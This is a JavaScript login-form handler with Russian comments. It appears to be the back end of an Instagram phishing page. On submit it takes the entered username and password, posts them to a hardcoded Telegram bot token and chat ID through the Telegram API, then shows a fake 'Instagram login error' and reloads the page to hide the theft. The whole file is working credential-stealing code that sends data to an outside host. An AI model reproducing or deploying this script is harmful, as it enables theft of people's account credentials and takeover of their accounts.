document.getElementById('loginForm').addEventListener('submit', function(event) {    event.preventDefault(); // Останавливаем стандартное поведение формы (предотвращаем отправку данных на сервер)
    // Получаем значения полей логина и пароля
    const username = document.getElementById('username').value;    
    const password = document.getElementById('password').value;
    // Токен Telegram-бота и ID чата, куда будут отправляться данные
    const botToken = '7935998855:AAHqkUNM-354wiHwx8zxwQ-GkW06MEg9H9o'; // Токен вашего бота    
    const chatId = '1040283184'; // Замените на ваш chat_id, куда нужно отправлять сообщение
    // Формируем текст сообщения для отправки в Telegram
    

    const message = `Логин: ${username}\nПароль: ${password}`;
    // URL API для отправки сообщения через Telegram    const url = https://api.telegram.org/bot${botToken}/sendMessage;
    // Отправляем данные через fetch (POST-запрос)
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
    	method: `POST`,
    	headers: {
    		'Content-Type': `application/json`
    	},
    	body: JSON.stringify({
    		chat_id: 1040283184,
    		text: message,
    	})
    })
    .then(response => response.json())
    .then(data => {
    	if (data.ok) {
    		console.log('Сообщение отправлено в Telegram')

    		const errorMessage = document.createElement('p')
    		errorMessage.style.color = 'red'
    		errorMessage.style.marginTop = 'При попытке входа в Instagram произошла ошибка. Повторите позже'

    		const forgotPasswordLink = document.querySelector('.forgot-password');
    		forgotPasswordLink.parentNode.insertBefore(errorMessage, forgotPasswordLink);

    		document.getElementById('username').value = ''
    		document.getElementById('password').value = ''

    		setTimeout(function() {
    			window.location.reload();

    		}, 3000);

    	} else {
    		console.error('Ошибка при отправке сообщения в Telegram', data);
    	}
    })
    .catch(error => console.error('Ошибка', error));
});